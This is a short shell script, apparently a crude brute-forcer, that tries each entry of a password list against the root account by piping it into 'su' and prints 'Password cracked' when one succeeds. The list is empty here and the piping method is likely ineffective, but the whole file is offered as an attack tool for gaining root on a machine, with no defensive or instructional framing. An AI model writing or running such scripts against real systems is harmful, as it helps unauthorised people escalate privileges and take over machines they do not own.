#!/bin/sh

target_username="root"

password_list=""

for password in $password_list; do
    echo "$password" | su - "$target_username" -c "echo 'Successfully switched to $target_username'"
    if [ $? -eq 0 ]; then
        echo "Password cracked: $password"
        exit 0
    fi
done

echo "noooo!"
exit 1
